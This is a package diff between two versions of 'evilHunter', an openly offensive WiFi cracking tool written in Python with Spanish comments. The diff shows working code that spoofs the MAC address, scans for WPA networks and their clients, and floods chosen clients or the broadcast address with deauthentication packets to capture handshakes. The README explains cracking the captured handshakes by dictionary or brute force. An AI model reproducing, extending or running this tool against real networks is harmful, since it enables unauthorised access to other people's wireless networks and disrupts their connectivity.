# Comparing `tmp/evilHunter-0.1.9.35.tar.gz` & `tmp/evilHunter-0.1.9.40.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "evilHunter-0.1.9.35.tar", last modified: Mon Jun 19 20:58:17 2023, max compression
+gzip compressed data, was "evilHunter-0.1.9.40.tar", last modified: Wed Jun 21 09:16:15 2023, max compression
```

## Comparing `evilHunter-0.1.9.35.tar` & `evilHunter-0.1.9.40.tar`

### file list

```diff
@@ -1,13 +1,13 @@
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-06-19 20:58:17.535492 evilHunter-0.1.9.35/
--rw-r--r--   0 root         (0) root         (0)     2606 2023-06-19 20:58:17.531492 evilHunter-0.1.9.35/PKG-INFO
--rw-r--r--   0 root         (0) root         (0)     2373 2023-06-19 20:51:06.000000 evilHunter-0.1.9.35/README.md
--rw-r--r--   0 root         (0) root         (0)     4239 2023-06-19 20:54:25.000000 evilHunter-0.1.9.35/evilCracker.py
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-06-19 20:58:17.531492 evilHunter-0.1.9.35/evilHunter.egg-info/
--rw-r--r--   0 root         (0) root         (0)     2606 2023-06-19 20:58:17.000000 evilHunter-0.1.9.35/evilHunter.egg-info/PKG-INFO
--rw-r--r--   0 root         (0) root         (0)      216 2023-06-19 20:58:17.000000 evilHunter-0.1.9.35/evilHunter.egg-info/SOURCES.txt
--rw-r--r--   0 root         (0) root         (0)        1 2023-06-19 20:58:17.000000 evilHunter-0.1.9.35/evilHunter.egg-info/dependency_links.txt
--rw-r--r--   0 root         (0) root         (0)       14 2023-06-19 20:58:17.000000 evilHunter-0.1.9.35/evilHunter.egg-info/requires.txt
--rw-r--r--   0 root         (0) root         (0)        6 2023-06-19 20:58:17.000000 evilHunter-0.1.9.35/evilHunter.egg-info/top_level.txt
--rw-r--r--   0 root         (0) root         (0)    22870 2023-06-19 20:47:46.000000 evilHunter-0.1.9.35/evilHunter.py
--rw-r--r--   0 root         (0) root         (0)       38 2023-06-19 20:58:17.535492 evilHunter-0.1.9.35/setup.cfg
--rw-r--r--   0 root         (0) root         (0)      558 2023-06-19 20:58:08.000000 evilHunter-0.1.9.35/setup.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-06-21 09:16:15.860605 evilHunter-0.1.9.40/
+-rw-r--r--   0 root         (0) root         (0)     2700 2023-06-21 09:16:15.860605 evilHunter-0.1.9.40/PKG-INFO
+-rw-r--r--   0 root         (0) root         (0)     2467 2023-06-20 11:55:29.000000 evilHunter-0.1.9.40/README.md
+-rw-r--r--   0 root         (0) root         (0)     4239 2023-06-19 20:54:25.000000 evilHunter-0.1.9.40/evilCracker.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-06-21 09:16:15.860605 evilHunter-0.1.9.40/evilHunter.egg-info/
+-rw-r--r--   0 root         (0) root         (0)     2700 2023-06-21 09:16:15.000000 evilHunter-0.1.9.40/evilHunter.egg-info/PKG-INFO
+-rw-r--r--   0 root         (0) root         (0)      216 2023-06-21 09:16:15.000000 evilHunter-0.1.9.40/evilHunter.egg-info/SOURCES.txt
+-rw-r--r--   0 root         (0) root         (0)        1 2023-06-21 09:16:15.000000 evilHunter-0.1.9.40/evilHunter.egg-info/dependency_links.txt
+-rw-r--r--   0 root         (0) root         (0)       14 2023-06-21 09:16:15.000000 evilHunter-0.1.9.40/evilHunter.egg-info/requires.txt
+-rw-r--r--   0 root         (0) root         (0)        6 2023-06-21 09:16:15.000000 evilHunter-0.1.9.40/evilHunter.egg-info/top_level.txt
+-rw-r--r--   0 root         (0) root         (0)    29066 2023-06-20 21:32:44.000000 evilHunter-0.1.9.40/evilHunter.py
+-rw-r--r--   0 root         (0) root         (0)       38 2023-06-21 09:16:15.860605 evilHunter-0.1.9.40/setup.cfg
+-rw-r--r--   0 root         (0) root         (0)      558 2023-06-21 09:15:32.000000 evilHunter-0.1.9.40/setup.py
```

### Comparing `evilHunter-0.1.9.35/PKG-INFO` & `evilHunter-0.1.9.40/PKG-INFO`

 * *Files 6% similar despite different names*

```diff
@@ -1,22 +1,26 @@
 Metadata-Version: 2.1
 Name: evilHunter
-Version: 0.1.9.35
+Version: 0.1.9.40
 Summary: Cracking WiFi(KCRACK)
 Home-page: https://github.com/an0mal1a/evilHunter
 Author: an0mal1a
 Author-email: pablodiez024@proton.me
 Description-Content-Type: text/markdown
 
 # evilHunter
 
+NOVEDADES:
+        
+        ¡Añadido ataque direccionado a cliente!
+        Reorganizado código...
+        Control de errores y reparación de bugs
 
 Argumentos:
-    
-    OBLIGATORIO
+     
         
         [♦] evilHunter [-w /path/to/wordlists] [-b 12 (passwd length)] [-t 400 (Nº of threads)]
         
             (-w / --wordlist)
                 [♦] -w /path/to/wordlists
 
             (-b / --brute)
@@ -27,15 +31,16 @@
 
             (-h / --help)
               
 # INSTALACIÓN:
 
 PyPi: (https://pypi.org/project/evilHunter/)
 
-    command_line = pip install evilHunter
+    ┌──(supervisor㉿kali-machine)-[~/Escritorio]
+    └─$ pip install evilHunter
                 &&
     ┌──(supervisor㉿kali-machine)-[~/Escritorio]
     └─$ evilHunter.py 
 
 Git Hub:
 
     Command Lines:
@@ -88,11 +93,10 @@
         
 
     4. Una véz capturado el handshake, abrimos el archivo .cap y
         con diccionary attack o generando contraseñas lo crackeamos.
 
 # _Proximas mejoras_
 
-                [♦]  Brute Force (Password Generator) more Faster
-                [♦]  Set a client target to deauth (more posibility of capture handshake)
+                [♦]  Brute Force (Password Generator) more Faster 
 
 For suggeriments or problems to fix --> https://github.com/an0mal1a/evilHunter/issues
```

### Comparing `evilHunter-0.1.9.35/README.md` & `evilHunter-0.1.9.40/evilHunter.egg-info/PKG-INFO`

 * *Files 8% similar despite different names*

```diff
@@ -1,13 +1,26 @@
+Metadata-Version: 2.1
+Name: evilHunter
+Version: 0.1.9.40
+Summary: Cracking WiFi(KCRACK)
+Home-page: https://github.com/an0mal1a/evilHunter
+Author: an0mal1a
+Author-email: pablodiez024@proton.me
+Description-Content-Type: text/markdown
+
 # evilHunter
 
+NOVEDADES:
+        
+        ¡Añadido ataque direccionado a cliente!
+        Reorganizado código...
+        Control de errores y reparación de bugs
 
 Argumentos:
-    
-    OBLIGATORIO
+     
         
         [♦] evilHunter [-w /path/to/wordlists] [-b 12 (passwd length)] [-t 400 (Nº of threads)]
         
             (-w / --wordlist)
                 [♦] -w /path/to/wordlists
 
             (-b / --brute)
@@ -18,15 +31,16 @@
 
             (-h / --help)
               
 # INSTALACIÓN:
 
 PyPi: (https://pypi.org/project/evilHunter/)
 
-    command_line = pip install evilHunter
+    ┌──(supervisor㉿kali-machine)-[~/Escritorio]
+    └─$ pip install evilHunter
                 &&
     ┌──(supervisor㉿kali-machine)-[~/Escritorio]
     └─$ evilHunter.py 
 
 Git Hub:
 
     Command Lines:
@@ -79,11 +93,10 @@
         
 
     4. Una véz capturado el handshake, abrimos el archivo .cap y
         con diccionary attack o generando contraseñas lo crackeamos.
 
 # _Proximas mejoras_
 
-                [♦]  Brute Force (Password Generator) more Faster
-                [♦]  Set a client target to deauth (more posibility of capture handshake)
+                [♦]  Brute Force (Password Generator) more Faster 
 
 For suggeriments or problems to fix --> https://github.com/an0mal1a/evilHunter/issues
```

### Comparing `evilHunter-0.1.9.35/evilCracker.py` & `evilHunter-0.1.9.40/evilCracker.py`

 * *Files identical despite different names*

### Comparing `evilHunter-0.1.9.35/evilHunter.egg-info/PKG-INFO` & `evilHunter-0.1.9.40/README.md`

 * *Files 13% similar despite different names*

```diff
@@ -1,22 +1,17 @@
-Metadata-Version: 2.1
-Name: evilHunter
-Version: 0.1.9.35
-Summary: Cracking WiFi(KCRACK)
-Home-page: https://github.com/an0mal1a/evilHunter
-Author: an0mal1a
-Author-email: pablodiez024@proton.me
-Description-Content-Type: text/markdown
-
 # evilHunter
 
+NOVEDADES:
+        
+        ¡Añadido ataque direccionado a cliente!
+        Reorganizado código...
+        Control de errores y reparación de bugs
 
 Argumentos:
-    
-    OBLIGATORIO
+     
         
         [♦] evilHunter [-w /path/to/wordlists] [-b 12 (passwd length)] [-t 400 (Nº of threads)]
         
             (-w / --wordlist)
                 [♦] -w /path/to/wordlists
 
             (-b / --brute)
@@ -27,15 +22,16 @@
 
             (-h / --help)
               
 # INSTALACIÓN:
 
 PyPi: (https://pypi.org/project/evilHunter/)
 
-    command_line = pip install evilHunter
+    ┌──(supervisor㉿kali-machine)-[~/Escritorio]
+    └─$ pip install evilHunter
                 &&
     ┌──(supervisor㉿kali-machine)-[~/Escritorio]
     └─$ evilHunter.py 
 
 Git Hub:
 
     Command Lines:
@@ -88,11 +84,10 @@
         
 
     4. Una véz capturado el handshake, abrimos el archivo .cap y
         con diccionary attack o generando contraseñas lo crackeamos.
 
 # _Proximas mejoras_
 
-                [♦]  Brute Force (Password Generator) more Faster
-                [♦]  Set a client target to deauth (more posibility of capture handshake)
+                [♦]  Brute Force (Password Generator) more Faster 
 
 For suggeriments or problems to fix --> https://github.com/an0mal1a/evilHunter/issues
```

### Comparing `evilHunter-0.1.9.35/evilHunter.py` & `evilHunter-0.1.9.40/evilHunter.py`

 * *Files 22% similar despite different names*

```diff
@@ -1,10 +1,11 @@
 #!/bin/python3
-
+# SUBIR A PYPI
 try:
+    # Importamos librerias
     print("\n[*] Starting...")
     print("\n\t[*] Comprobando librerias...")
     import string
     import re
     import colorama
     from colorama import Fore
     import os
@@ -21,37 +22,38 @@
 
 except ModuleNotFoundError as e:
     print("\n\n[!] Faltan modulos necesario para la ejecucion...\n\t%s" % e)
     print("[!] Exiting...")
     exit(1)
 
 #
-# funciona... intentar conseguir clientes a los que atacar
-# MAC -> (([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2}))
-# Reestructurar el las carpteas creadas
-# Crear carpeta (EvilHunter_Data)
+# Falta atacar a los clientes, tenemos el cliente y la red bien filtrada
 #
 
 
 def delete_files():
+    # Borramos archivos innnecesarios
     os.system('find /home/EvilHunter_Data/captures -type f ! -name "*.cap" -delete > /dev/null')
     os.system('rm /home/EvilHunter_Data/espec/*')
 
 
 def restart_net():
+    # Reiniciamosd red
     os.system("service networking restart > /dev/null")
     os.system("service NetworkManager restart > /dev/null")
 
 
 def stop_monitoring():
+    # Paramos modo monitor
     if os.system("airmon-ng stop {} > /dev/null".format(interface)) != 0:
         os.system("airmon-ng stop {} > /dev/null".format(interface))
 
 
 def exiting(err):
+    # Salida con o sin error
     if err:
         if err is True:
             print(Fore.YELLOW + "\n[*] " + Fore.RED + "Exiting due a error...\n\n", err)
 
         elif err == "done":
             print(Fore.YELLOW + "\n\n[*] " + Fore.RED + "Exiting tool...")
 
@@ -65,15 +67,15 @@
         Fore.WHITE + "\n  ·  ·  ·  · " + Fore.YELLOW + "[*] " +
         Fore.LIGHTCYAN_EX + "Restoring mac address..." + Fore.RESET
 
         + Fore.WHITE + "\n  ·  ·  ·  · " + Fore.YELLOW + "[*] " +
         Fore.LIGHTCYAN_EX + "Stopping monitor mode..." + Fore.RESET
 
         + Fore.WHITE + "\n  ·  ·  ·  · " + Fore.YELLOW + "[*] " +
-                        Fore.LIGHTCYAN_EX + "Restarting network services")
+        Fore.LIGHTCYAN_EX + "Restarting network services")
 
     try:
         restore_mac()
     except NameError:
         pass
 
     try:
@@ -87,50 +89,52 @@
     restart_net()
 
     print(Fore.YELLOW + "\n[!] " + Fore.GREEN + "Exit Succesfull")
     exit()
 
 
 def am_i_root():
-
+    # somos root?
     if os.getuid() != 0:
         print(Fore.RED + "\n[!] Necesitamos ser root...")
         exit(1)
 
 
 def change_mac(interface):
     # Apagamos tarjeta de red:
     os.system("bash -c 'ifconfig {} down'".format(interface))
 
     # Modificamos direccion MAC
     os.system(f"macchanger -r {interface} > new_mac.txt")
-    mc = os.system("cat new_mac.txt  | grep 'New' | awk '{print $2}' FS='MAC:' | awk '{print $1}' > /home/EvilHunter_Data/espec/mac.txt")
+    mc = os.system("cat new_mac.txt  | grep 'New' | awk '{print $2}' FS='MAC:' | awk '{print $1}' > mac.txt")
 
     # Encendemos tarjeta de red
     os.system(f"bash -c 'ifconfig {interface} up'")
 
     if mc == 0:
-        mac = open("/home/EvilHunter_Data/espec/mac.txt", "r"); mac = mac.read()
+        mac = open("mac.txt", "r")
+        mac = mac.read()
         return mac
     else:
         return None
 
 
 def restore_mac():
     # Apagamos tarjeta de red:
-    os.system("ifconfig {} down".format(interface))
+    os.system("ifconfig {} down > /dev/null".format(interface))
 
     os.system("airmon-ng check kill > /dev/null")
     os.system(f"macchanger -p {interface} > /dev/null")
 
     # Encendemos tarjeta de red
-    os.system('ifconfig {} up'.format(interface))
+    os.system('ifconfig {} up > /dev/null'.format(interface))
 
 
 def check_utilities():
+    # Comprobamos herramientas necesarias
     non_installed = {}
     tools = 0
 
     print(Fore.YELLOW + "\n[*] " + Fore.BLUE + "Comprobando herramientas necesarias...\n")
 
     # Comprobamos todas la herramientas...
     if os.system("command -v airmon-ng > /dev/null") != 0:
@@ -198,42 +202,53 @@
     global interface
 
     # Modo monitor y verificar estado con "iwconfig"
     os.system("airmon-ng start %s > /dev/null" % choosed_interface)
 
     # Ver nombre de la interfaz
     os.system("ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > /home/EvilHunter_Data/espec/intif")
-    os.system("cat /home/EvilHunter_Data/espec/intif | grep {} > /home/EvilHunter_Data/espec/iface".format(choosed_interface))
+    os.system("cat /home/EvilHunter_Data/espec/intif | grep {} > /home/EvilHunter_Data/espec/iface"
+              .format(choosed_interface))
 
+    # leemos archivo de la interfaz (seleccionada)
     with open("/home/EvilHunter_Data/espec/iface", "r") as iface:
         interface = iface.read()
     interface = interface.replace("\n", "")
 
     print(Fore.BLUE + "\n\t[" + Fore.RED + "V" + Fore.BLUE + "] " + Fore.YELLOW +
           "Cambiando MAC address de " + Fore.LIGHTCYAN_EX + f"{choosed_interface}" + Fore.RESET)
-    mac = change_mac(interface).strip()
+    try:
+        # Intentamos cambiar mac address
+        mac = change_mac(interface).strip()
+    except AttributeError as e:
+        exiting(err=e)
 
     if mac:
         print(Fore.BLUE + "\n\t[" + Fore.RED + "V" + Fore.BLUE + "] " + Fore.YELLOW +
               "Dirección MAC actual: " + Fore.LIGHTCYAN_EX + f"{mac}.")
     else:
         print(Fore.BLUE + "\n\t[" + Fore.RED + "V" + Fore.BLUE + "] " + Fore.LIGHTYELLOW_EX +
               "Dirección MAC no modificada correctamente..." + Fore.LIGHTCYAN_EX + f"{mac}.")
 
-    os.system("iwconfig {} | grep -Eo 'Mode:([A-Z][a-z]+)' | cut -d: -f2 > /home/EvilHunter_Data/espec/mode".format(interface))
+    # Miramos si esta en modo monitor
+    os.system("iwconfig {} | grep -Eo 'Mode:([A-Z][a-z]+)' | cut -d: -f2 > /home/EvilHunter_Data/espec/mode"
+              .format(interface))
+
+    # Leemos archhivo sobre el modo en el que está
     with open("/home/EvilHunter_Data/espec/mode", "r") as mde:
         mode = mde.read().strip()
     try:
         if mode != "Monitor":
             return 1
         else:
             return 0
     except Exception as err:
         exiting(err)
 
+
 def list_save_interf():
     print(Fore.YELLOW + "\n[*] " + Fore.LIGHTCYAN_EX + "Mostrando Intefaces Disponibles...")
 
     time.sleep(1)
     # Creamos archivo con interfaces disponibles
     os.system("ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > /home/EvilHunter_Data/espec/net")
     nums = 0
@@ -306,159 +321,322 @@
             if output not in all_got:
                 all_got.append(output)
             print(output.decode().strip())
         except KeyboardInterrupt:
             break
     print(Fore.LIGHTCYAN_EX + "\n\n[*] " + Fore.RESET + "Ended session of capture data...")
     print(Fore.BLUE + "\n\t[T] " + Fore.YELLOW + "Packets captured...")
-    process_data(all_got, args)
-
-
-def process_data(all_got, args):
-    dict = {}
-    print(Fore.BLUE + "\n\t[Y] " + Fore.YELLOW + "Processing data")
-    time.sleep(1)
 
     with open("/home/EvilHunter_Data/espec/data", "wb") as data:
         for line in all_got:
             data.write(line)
 
-    # Filtramos el archivo
-    os.system('cat /home/EvilHunter_Data/espec/data | grep -oP "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" | sort -u > /home/EvilHunter_Data/espec/bssid')
+    macs = filter_data()
+    net_clients = clients_process_data(macs)
+    network_process_data(macs, net_clients, args, all_got)
+
+
+def filter_data():
+    # Filtramos data por macs (todas)
+    os.system('cat /home/EvilHunter_Data/espec/data | grep -Eo "(([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2}))"'
+              ' | sort -u > /home/EvilHunter_Data/espec/macs')
+
+    # leemos archivo de macs
+    with open("/home/EvilHunter_Data/espec/macs", "r") as macs:
+        macs = macs.read().split()
+    return macs
+
+
+def get_bssid_and_client(validate):
+    # Buscamos dos macs seguidas juntas (bssid y cliente), si no continuamops
+    bssid_and_client = re.search(
+        "((([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2}))+ +(([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})))", validate)
+    bssid_and_client = bssid_and_client.group(1)
+    bssid_and_client = bssid_and_client.split(" ")
+
+    # Definimos cliente y acces point
+    bssid = bssid_and_client[0]
+    client = bssid_and_client[1]
+    return bssid, client
+
+
+def clients_process_data(macs):
+    # Dict con bssid y clientes
+    net_clients = {'networks': {}}
+    client_num = 0
+    net_num = 0
+    existing_networks = {}
+
+    # Recorremos las macs
+    for mac in macs:
+        # Creamos archivi con bssid y cliente si existe y si no continuamos
+        os.system("cat /home/EvilHunter_Data/espec/data | grep " + mac +
+                  " | cut -d' ' -f 2,4 | sort -u > /home/EvilHunter_Data/espec/validate")
+
+        with open('/home/EvilHunter_Data/espec/validate', "r") as validate:
+            validate = validate.read()
 
-    # Abriumos el arhivo de bssids
-    with open("/home/EvilHunter_Data/espec/bssid", "rb") as bssids:
-        bssids = (bssids.read()).decode()
-    bssids = bssids.split("\n")
+        try:
+            # recogemos bssid y cliente mac
+            bssid, client = get_bssid_and_client(validate)
+
+            # Buscamos el bssid en el diccionario
+            if bssid in existing_networks:
+                net_index = existing_networks[bssid]
+
+                # Si el cliente no existe, creamos seccion
+                if client not in net_clients['networks'][net_index][bssid]['clients'].values():
+                    client_num = max(net_clients['networks'][net_index][bssid]['clients'].keys()) + 1
+                    net_clients['networks'][net_index][bssid]['clients'][client_num] = client
+
+            # Si no está creamos sección
+            else:
+                existing_networks[bssid] = net_num
+                net_clients['networks'][net_num] = {bssid: {'clients': {client_num: client}}}
+                net_num += 1
 
-    for bssid in bssids:
-        if not bssid:
+            client_num += 1
+        except AttributeError:
             continue
-        os.system("cat /home/EvilHunter_Data/espec/data | grep {} | sort -u > /home/EvilHunter_Data/espec/{}".format(bssid, bssid))
+        # limpiamos numero de clientes de red
+        client_num = 0
+
+        # Borramos archivo validate
+        os.remove("/home/EvilHunter_Data/espec/validate")
 
-        with open("/home/EvilHunter_Data/espec/"+bssid, "rb") as all_data:
+    return net_clients
+
+
+def network_process_data(macs, net_clients, args, all_got):
+    net_specs = {}
+    for mac in macs:
+        if not mac:
+            continue
+
+        os.system("cat /home/EvilHunter_Data/espec/data | grep {} | sort -u > /home/EvilHunter_Data/espec/{}"
+                  .format(mac, mac))
+
+        with open("/home/EvilHunter_Data/espec/" + mac, "rb") as all_data:
             all_data = all_data.read()
         data = all_data.decode().split()
 
         obetives = []
         num = 0
 
         for itera in data:
             num += 1
             if itera not in obetives:
                 obetives.append(itera)
 
         info = "  ".join(obetives)
         n_d = 0
+
         if re.findall("-[0-9]+", info):
             encription = re.findall("WPA[0-9]  [A-Z]+  +[A-Z]+", info)
 
             if not encription:
                 continue
 
             channel = info.split()[info.split().index("WPA2") - 2]
             name = info.split()[info.split().index("WPA2") + 3]
-
             if re.findall("^(<length:*)", name):
                 name = f"N/D_{n_d}"
                 n_d += 1
 
-            dict[name] = {"bssid": bssid,
-                          "encription_type": encription[0],
-                          "channel": channel}
+            net_specs[name] = {"bssid": mac,
+                               "encription_type": encription[0],
+                               "channel": channel}
 
         else:
             continue
-    print_process_data(dict, args)
+    print_process_data(net_specs, net_clients, args, all_got)
+
 
+def print_process_data(net_specs, net_clients, args, all_got):
+    print(Fore.BLUE + "\n\t[Y] " + Fore.YELLOW + "Processing data")
+    time.sleep(1)
+
+    with open("/home/EvilHunter_Data/espec/data", "wb") as data:
+        for line in all_got:
+            data.write(line)
 
-def print_process_data(dict, args):
     print(Fore.LIGHTCYAN_EX + "\n[" + Fore.RED + "V" + Fore.LIGHTCYAN_EX + "] " + Fore.YELLOW +
           "Listing aviable networks to attack...")
 
     # Asingamos variables necesarias
     net = 0
 
-    print(Fore.YELLOW + "\n\t[*] " + Fore.LIGHTCYAN_EX + "Preparing information for networks...".format(net)
-          + Fore.RESET)
-    for network in dict:
+    print(Fore.YELLOW + "\n\t[*] " + Fore.LIGHTCYAN_EX + "Preparing information for networks...".format(net) +
+          Fore.RESET)
+
+    for network in net_specs:
+        clients = None
         net += 1
+
+        # RED INFO:
+        bssid = net_specs[network]['bssid']
+        channel = net_specs[network]['channel']
+        cipher_type = net_specs[network]["encription_type"]
+
         time.sleep(0.5)
 
         print(Fore.YELLOW + f"\n\t{net}.[*] " + Fore.RED + "Name -> " + Fore.GREEN + "{}\n".format(network) + "\n\t\t" +
-              Fore.YELLOW + "[+] " + Fore.BLUE + "BSSID -> " + Fore.GREEN + "{}".format(dict[network]['bssid']) + "\t\t"
-              + Fore.YELLOW + "[+] " + Fore.BLUE + "Channel -> " + Fore.GREEN + "{}".format(dict[network]['channel']) +
-              "\t\t" + Fore.YELLOW + "[+] " + Fore.BLUE + "Encryption -> " + Fore.GREEN + "{}".format(
-            dict[network]["encription_type"]))
+              Fore.YELLOW + "[+] " + Fore.BLUE + "BSSID -> " + Fore.GREEN + "{}".format(bssid) + "\t\t"
+              + Fore.YELLOW + "[+] " + Fore.BLUE + "Channel -> " + Fore.GREEN + "{}".format(channel) +
+              "\t\t" + Fore.YELLOW + "[+] " + Fore.BLUE + "Encryption -> " + Fore.GREEN + "{}".format(cipher_type))
+
+        # CLIENTES INFO:
+        for net_num in net_clients['networks']:
+            try:
+                if net_clients['networks'][net_num][bssid]:
+                    clients = net_clients['networks'][net_num][bssid]['clients']
+                    break
+            except KeyError:
+                continue
+
+        if clients:
+            # Clients of the net:
+            text = Fore.YELLOW + "\n\n\t\t\t\t     [♦]" + Fore.MAGENTA + "   AVIABLE / DETECTED CLIENTS."
+            print(text)
+            print(Fore.YELLOW + "\t\t\t\t" + "-" * len(text))
+
+            for client_num in clients:
+                client = clients[client_num]
+                print(Fore.RED + "\t\t\t\t\t  [!] " + Fore.BLUE + f"{client_num} ---> " + Fore.WHITE + f"{client}")
+
+        else:
+            text = Fore.WHITE + "\n\n\t\t\t\t     [♦]    NO DETECTED CLIENTS..."
+            print(text)
+            print("\t\t\t\t" + "-" * len(text))
+
         print("\n\n\t", Fore.LIGHTYELLOW_EX + "▄" * 115, "\n\n")
+    select_network(net_specs, net_clients, args)
+
 
+def select_network(net_specs, net_clients, args):
     network_to_attack = None
     while not network_to_attack:
         network_to_attack = input(Fore.YELLOW + "\n[!>] " + Fore.WHITE + "Network to attack (E.j 'MOVISTAR_XXXX'): ")
 
-        if network_to_attack not in dict:
+        if network_to_attack not in net_specs:
             print(Fore.YELLOW + "\n\t[!] " + Fore.RED + "La red {} no ha sido detectada..".format(network_to_attack))
             network_to_attack = None
         else:
             print(Fore.YELLOW + "\n\t[*] " + Fore.LIGHTCYAN_EX + "Red encontrada!")
             time.sleep(0.5)
             print(Fore.LIGHTCYAN_EX + "\n[*] " + Fore.YELLOW + "Preparando entorno...")
-            prepare_attack(dict, network_to_attack, args)
+    prepare_attack(net_specs, net_clients, network_to_attack, args)
 
 
-def prepare_attack(dict, network_to_attack, args):
+def prepare_attack(net_specs, net_clients, network_to_attack, args):
     file = None
 
     while not file:
         file = input(Fore.YELLOW + "\n\t[" + Fore.RED + "S" + Fore.YELLOW + "] " + 
                      Fore.LIGHTCYAN_EX + "Enter the name of the file to save [E.j capture1] > ")
 
-        if os.system("find /home/EvilHunter_Data/captures/{}/{}* 2>/dev/null 1>/dev/null".format(network_to_attack, file)) == 0:
+        if os.system("find /home/EvilHunter_Data/captures/{}/{}* 2>/dev/null 1>/dev/null"
+                     .format(network_to_attack, file)) == 0:
             print(Fore.RED + "\n\t\t[!] " + Fore.YELLOW + "Este nombre ya esta usado por algún archivo.")
             file = None
 
     # Definimos bssid y channel
-    bssid = dict[network_to_attack]['bssid']
-    ch = dict[network_to_attack]['channel']
+    bssid = net_specs[network_to_attack]['bssid']
+    ch = net_specs[network_to_attack]['channel']
 
     # Leer handshake
     direc = "/home/EvilHunter_Data/captures/" + network_to_attack
 
+    if net_clients:
+        attack_client = print_clients(net_clients, bssid)
+    else:
+        attack_client = None
+
     time.sleep(1)
     print(Fore.YELLOW + "\n[*] " + Fore.LIGHTRED_EX + "INICIANDO:" + Fore.LIGHTCYAN_EX + " Captura de " +
           Fore.RED + 'WPA handshake ' + Fore.LIGHTCYAN_EX +
           Fore.YELLOW + "ESPERE... --->  " + Fore.LIGHTCYAN_EX + "[CTRL + C] to stop manually..." + Fore.RESET)
 
     input(Fore.YELLOW + "\n\t\t[ENTER] To continue\n")
 
-    capture = multiprocessing.Process(target=capture_handshake(direc, args, bssid, ch, file, network_to_attack))
+    capture = multiprocessing.Process(target=capture_handshake(direc, args, bssid, ch,
+                                                               file, network_to_attack, attack_client))
 
     # Iniciamos la captura del handshake y envio de deauth
     capture.start()
 
     # Juntamos para detener
     capture.join()
 
 
-def capture_handshake(direc, args, bssid, ch, file, network_to_attack):
+def print_clients(net_clients, bssid):
+    print(Fore.YELLOW + "\n\n[*] " + Fore.LIGHTBLUE_EX + "Listing clients of the network\n" + Fore.RESET)
+
+    # CLIENTES DE RED INFO:
+    for net_num in net_clients['networks']:
+        try:
+            if net_clients['networks'][net_num][bssid]:
+                clients_of_net = net_clients['networks'][net_num][bssid]['clients']
+                break
+        except KeyError:
+            continue
+
+    # Recorremos clientes de la red seleccionada
+    for client_num in clients_of_net:
+        client = clients_of_net[client_num]
+        print("\t" + Fore.RED + f"{client_num} ---> " + Fore.WHITE + f"{client}\n")
+
+    select_client(clients_of_net)
+
+
+def select_client(clients):
+    # Escogemos un cliente
+    client = None
+    while not client:
+        num_client = int(input(Fore.YELLOW + "\n[!>] " + Fore.WHITE + "Number of the client to attack (E.j '1'): "))
+
+        # Si no existe el numero de cliente, seguimos preguntando
+        if num_client not in clients:
+            print(Fore.YELLOW + "\n\t[!] " + Fore.RED + "El cliente Nº{} no ha sido detectado..".format(num_client))
+            client = None
+
+        # Si existe rompemos bucle y seguimos...
+        elif num_client in clients:
+            print(Fore.YELLOW + "\n\t[*] " + Fore.LIGHTCYAN_EX + "Cliente encontrado!")
+            client = clients[num_client]
+            time.sleep(0.5)
+    # Devolvemos cliente a atacar
+    return client
+
+
+def capture_handshake(direc, args, bssid, ch, file, network_to_attack, attack_client):
     if not os.path.exists(f"/home/EvilHunter_Data/captures/{network_to_attack}/"):
         os.makedirs(f"/home/EvilHunter_Data/captures/{network_to_attack}/")
 
-    hand = subprocess.Popen(["airodump-ng", "-w", f"/home/EvilHunter_Data/captures/{network_to_attack}/" + file, "-c", ch, "--bssid", bssid,
+    hand = subprocess.Popen(["airodump-ng", "-w", f"/home/EvilHunter_Data/captures/{network_to_attack}/"
+                             + file, "-c", ch, "--bssid", bssid,
                              f"{interface}"], stdout=subprocess.PIPE)
-
-    subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, interface], stdout=subprocess.DEVNULL)
+    # Si tenemos cliente  para atacar:
+    if attack_client is not None:
+        subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, "-c", attack_client, interface],
+                         stdout=subprocess.DEVNULL)
+    # Si no al broadcast
+    else:
+        subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, interface],
+                         stdout=subprocess.DEVNULL)
 
     done = False
     while True:
         try:
             output = hand.stdout.readline()
             print(output.decode().strip())
             if "WPA handshake:".encode() in output:
+                # Dejamos que se envien correctamente todos los paquetes
                 done = True
+                # Rompemos búcle
                 break
 
         except KeyboardInterrupt:
             break
 
     print(Fore.LIGHTCYAN_EX + "\n\n\n\n\n\n\n\n\n\n\n\n[T] " + Fore.YELLOW + "Comprobando captura de hanshake")
     if done:
```

### Comparing `evilHunter-0.1.9.35/setup.py` & `evilHunter-0.1.9.40/setup.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 from setuptools import setup
 
 with open("README.md", "r", encoding="utf-8") as fh:
     long_description = fh.read()
 
 setup(
     name="evilHunter",
-    version="0.1.9.35",
+    version="0.1.9.40",
     description="Cracking WiFi(KCRACK)",
     long_description=long_description,
     long_description_content_type="text/markdown",
     author="an0mal1a",
     url="https://github.com/an0mal1a/evilHunter",
     author_email="pablodiez024@proton.me",
     packages=["words"],
```

